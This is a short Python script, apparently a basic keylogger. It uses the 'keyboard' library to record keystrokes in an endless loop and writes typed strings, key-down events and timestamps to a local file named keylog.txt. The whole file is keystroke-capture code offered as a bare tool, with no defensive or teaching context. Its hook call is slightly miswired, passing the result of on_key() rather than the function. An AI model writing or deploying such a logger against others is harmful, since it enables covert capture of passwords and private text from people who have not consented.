import keyboard
import datetime


file = open("./keylog.txt", "w", encoding = "utf-8")


def on_key():
    now = datetime.datetime.today()
    file.write(str(now))

    events = keyboard.record()
    keywords =list()
    allkeys = list()



    for i in keyboard.get_typed_strings(events, allow_backspace= True):
        keywords.append(i)
        file.write("\n")
        file.write(i)


    for i in events:
        istr = str(i)
        if "down" in istr:
            istr = istr.strip("KeyboardEvent").split(" ")[0]+")"
            allkeys.append(istr)

        elif "shift" in istr:
            istr = istr.strip("KeyboardEvent ").split(" ")[0]+")"
            allkeys.append(istr)

        else:
            continue
 
    file.write("\n")
    file.write(str(allkeys))
    file.write("\n")
    file.write(str(now))




while True:
    keyboard.hook(on_key())
